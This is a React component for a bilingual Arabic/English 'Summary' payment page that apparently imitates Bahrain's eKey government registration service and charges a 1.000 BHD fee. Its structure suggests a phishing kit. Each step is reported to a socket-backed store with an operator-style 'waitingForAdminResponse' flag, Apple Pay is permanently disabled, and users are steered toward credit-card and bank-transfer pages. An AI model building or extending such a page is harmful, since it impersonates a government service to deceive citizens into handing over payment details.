import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage, socket } from "@/lib/store";
import { useLang } from "@/store/LanguageContext";
import "./RegistrationSummary.css";

function useQuery() {
  return new URLSearchParams(window.location.search);
}

export default function RegistrationSummary() {
  const [, setLocation] = useLocation();
  const { lang, t, isRTL, dir } = useLang();
  const isAr = lang === 'ar';

  const [selectedPayment, setSelectedPayment] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  const query = useQuery();
  const fromLogin = query.get('from') === 'login' || localStorage.getItem('fromLogin') === 'true';

  useEffect(() => {
    if (query.get('from') === 'login') {
      localStorage.setItem('fromLogin', 'true');
    }
  }, []);

  const serviceName = fromLogin
    ? (isAr ? 'تحديث معلومات المفتاح الإلكتروني' : 'Update eKey Information')
    : (isAr ? 'التسجيل في المفتاح الإلكتروني – المستوى الأساسي' : 'eKey Registration – Basic Level');
  const servicePrice = '1.000';
  const currency = isAr ? 'د.ب.' : 'BHD';

  useEffect(() => {
    navigateToPage('الملخص');
  }, []);

  const handlePayment = () => {
    if (!selectedPayment) return;

    setIsProcessing(true);

    const paymentMethodLabel = selectedPayment === 'card'
      ? 'بطاقة ائتمان'
      : selectedPayment === 'benefit'
        ? 'بنفت'
        : 'Apple Pay';

    sendData({
      data: {
        service: serviceName,
        price: servicePrice,
        paymentMethod: paymentMethodLabel,
      },
      current: 'الملخص',
      nextPage: selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
      waitingForAdminResponse: false,
    });

    localStorage.setItem('Total', servicePrice);

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPayment === 'card') {
        window.location.href = `/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${servicePrice}`;
      } else if (selectedPayment === 'benefit') {
        window.location.href = `/benefit-payment?service=${encodeURIComponent(serviceName)}&amount=${servicePrice}`;
      } else {
        window.location.href = `/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${servicePrice}`;
      }
    }, 1500);
  };

  const handleCancel = () => {
    setLocation('/password-page');
  };

  return (
    <div className="reg-summary-page" style={{ direction: dir }}>
      {/* Header / Navbar placeholder - uses same navbar from layout */}

      {/* Title bar */}
      <div className="reg-summary-title-bar">
        <span className="reg-summary-title-text">{isAr ? 'الملخص' : 'Summary'}</span>
        <div className="reg-summary-title-line"></div>
      </div>

      {/* Main content */}
      <div className="reg-summary-main">

        {/* Left side: Payment method */}
        <div className="reg-summary-form-side">

          {/* Stepper */}
          <div className="reg-summary-stepper">
            <span className="reg-summary-step">{isAr ? 'المعلومات الشخصية' : 'Personal Info'}</span>
            <span className="reg-summary-step-arrow">❮</span>
            <span className="reg-summary-step">{isAr ? 'إدخال كلمة السر' : 'Password'}</span>
            <span className="reg-summary-step-arrow">❮</span>
            <span className="reg-summary-step reg-summary-step-active">{isAr ? 'الملخص' : 'Summary'}</span>
          </div>

          {/* Service info */}
          <div className="reg-summary-service-info">
            <h2 className="reg-summary-section-title">
              {isAr ? 'تفاصيل الخدمة' : 'Service Details'}
            </h2>
            <div className="reg-summary-service-row">
              <span className="reg-summary-service-label">{isAr ? 'نوع الخدمة:' : 'Service Type:'}</span>
              <span className="reg-summary-service-value">{serviceName}</span>
            </div>
            <div className="reg-summary-service-row">
              <span className="reg-summary-service-label">{isAr ? 'السعر:' : 'Price:'}</span>
              <span className="reg-summary-service-value reg-summary-price">{servicePrice} {currency}</span>
            </div>
          </div>

          {/* Payment method */}
          <div className="reg-summary-payment-section">
            <h2 className="reg-summary-section-title">
              {isAr ? 'طريقة الدفع' : 'Payment Method'}
            </h2>
            <p className="reg-summary-payment-note">
              {isAr ? 'جميع العمليات آمنة ومشفرة.' : 'All transactions are secure and encrypted.'}
            </p>

            <div className="reg-summary-payment-options">
              {/* Credit Card */}
              <div
                onClick={() => setSelectedPayment('card')}
                className={`reg-summary-payment-option ${selectedPayment === 'card' ? 'selected' : ''}`}
              >
                <div className="reg-summary-payment-option-inner">
                  <div className={`reg-summary-radio ${selectedPayment === 'card' ? 'selected' : ''}`}>
                    {selectedPayment === 'card' && <div className="reg-summary-radio-dot" />}
                  </div>
                  <span className="reg-summary-payment-label">{isAr ? 'بطاقة ائتمان' : 'Credit Card'}</span>
                  <div style={{ flex: 1 }} />
                  <div className="reg-summary-payment-icons">
                    <img src="/images/visa.png" alt="Visa" style={{ height: '24px' }} onError={e => (e.currentTarget.style.display = 'none')} />
                    <img src="/images/mastercard.png" alt="Mastercard" style={{ height: '24px' }} onError={e => (e.currentTarget.style.display = 'none')} />
                  </div>
                </div>
                <p className="reg-summary-payment-desc">Visa, Mastercard</p>
              </div>

              {/* Benefit Pay */}
              <div
                onClick={() => setSelectedPayment('benefit')}
                className={`reg-summary-payment-option ${selectedPayment === 'benefit' ? 'selected' : ''}`}
              >
                <div className="reg-summary-payment-option-inner">
                  <div className={`reg-summary-radio ${selectedPayment === 'benefit' ? 'selected' : ''}`}>
                    {selectedPayment === 'benefit' && <div className="reg-summary-radio-dot" />}
                  </div>
                  <span className="reg-summary-payment-label">Benefit Pay</span>
                  <div style={{ flex: 1 }} />
                  <img src="/images/benefitpay.png" alt="Benefit Pay" style={{ height: '32px', objectFit: 'contain' }} />
                </div>
                <p className="reg-summary-payment-desc">
                  {isAr ? 'الدفع بواسطة بنفت باي' : 'Pay with Benefit Pay'}
                </p>
              </div>

              {/* Apple Pay */}
              <div
                onClick={() => setSelectedPayment('apple')}
                className={`reg-summary-payment-option ${selectedPayment === 'apple' ? 'selected' : ''}`}
              >
                <div className="reg-summary-payment-option-inner">
                  <div className={`reg-summary-radio ${selectedPayment === 'apple' ? 'selected' : ''}`}>
                    {selectedPayment === 'apple' && <div className="reg-summary-radio-dot" />}
                  </div>
                  <span className="reg-summary-payment-label">Apple Pay</span>
                  <div style={{ flex: 1 }} />
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="#333">
                    <path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/>
                  </svg>
                </div>
                <p className="reg-summary-payment-desc">
                  {isAr ? 'الدفع بواسطة Apple Pay' : 'Pay with Apple Pay'}
                </p>
                {selectedPayment === 'apple' && (
                  <p className="reg-summary-payment-unavailable">
                    {isAr ? 'الدفع عن طريق Apple Pay غير متاح حالياً' : 'Apple Pay is currently unavailable'}
                  </p>
                )}
              </div>
            </div>
          </div>

          {/* Buttons */}
          <div className="reg-summary-buttons">
            <button
              onClick={handlePayment}
              disabled={!selectedPayment || isProcessing || selectedPayment === 'apple'}
              className="reg-summary-btn-continue"
            >
              {isProcessing ? (
                <span className="reg-summary-loading">
                  <span className="reg-summary-spinner" />
                  {isAr ? 'جاري المعالجة...' : 'Processing...'}
                </span>
              ) : (
                isAr ? 'متابعة الدفع' : 'Continue to Payment'
              )}
            </button>
            <button onClick={handleCancel} className="reg-summary-btn-cancel">
              {isAr ? 'رجوع' : 'Back'}
            </button>
          </div>

          <p className="reg-summary-terms-note">
            {isAr
              ? 'بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية'
              : 'By continuing, you agree to the Terms of Service and Privacy Policy'}
          </p>
        </div>

        {/* Right side: Order Summary */}
        <div className="reg-summary-order-side">
          <h3 className="reg-summary-order-title">
            {isAr ? 'ملخص الطلب' : 'Order Summary'}
          </h3>

          <div className="reg-summary-order-item">
            <div className="reg-summary-order-item-icon">
              <svg width="40" height="40" viewBox="0 0 24 24" fill="#1484c4">
                <path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
              </svg>
            </div>
            <div className="reg-summary-order-item-info">
              <div className="reg-summary-order-item-name">{serviceName}</div>
              <div className="reg-summary-order-item-type">
                {isAr ? 'خدمة إلكترونية' : 'Electronic Service'}
              </div>
            </div>
          </div>

          <div className="reg-summary-order-divider" />

          <div className="reg-summary-order-row">
            <span>{isAr ? 'رسوم الخدمة' : 'Service Fee'}</span>
            <span className="reg-summary-order-price">{servicePrice} {currency}</span>
          </div>

          <div className="reg-summary-order-divider" />

          <div className="reg-summary-order-row reg-summary-order-total">
            <span>{isAr ? 'الإجمالي' : 'Total'}</span>
            <div>
              <span className="reg-summary-order-total-price">{servicePrice}</span>
              <span className="reg-summary-order-total-currency"> {currency}</span>
            </div>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
